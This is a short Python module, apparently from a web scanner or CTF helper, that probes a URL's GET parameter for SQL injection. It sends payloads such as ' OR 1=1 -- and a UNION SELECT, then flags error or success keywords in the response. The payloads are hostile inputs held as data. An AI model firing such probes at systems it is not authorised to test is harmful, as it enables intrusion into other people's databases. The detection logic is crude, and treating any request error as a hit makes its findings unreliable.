import requests
from .queryFinder import smart_query_param_finder
import requests


def test_sqli_get(url, param):
    payloads = [
        "' OR 1=1 --",
        "' UNION SELECT null, null --",
        "' AND 1=2 --"
    ]

    for payload in payloads:
        params = {param: payload}

        try:
            r = requests.get(url, params=params, timeout=5)

            res_text = r.text.lower()

            if any(keyword in res_text for keyword in ["welcome", 'sql',"flag", "sql syntax", "sql error", "database error", "you have an error in your sql"]):
                print(f"[+] Possible SQLi (HTTP) with payload: {payload}")
                print(f"[+] Response snippet: {r.text[:200]}")
                return payload

        except requests.exceptions.RequestException as e:
            print(f"[+] Possible SQLi (App crash) with payload: {payload}")
            print(f"[!] Exception: {str(e)}")
            return payload

    return None
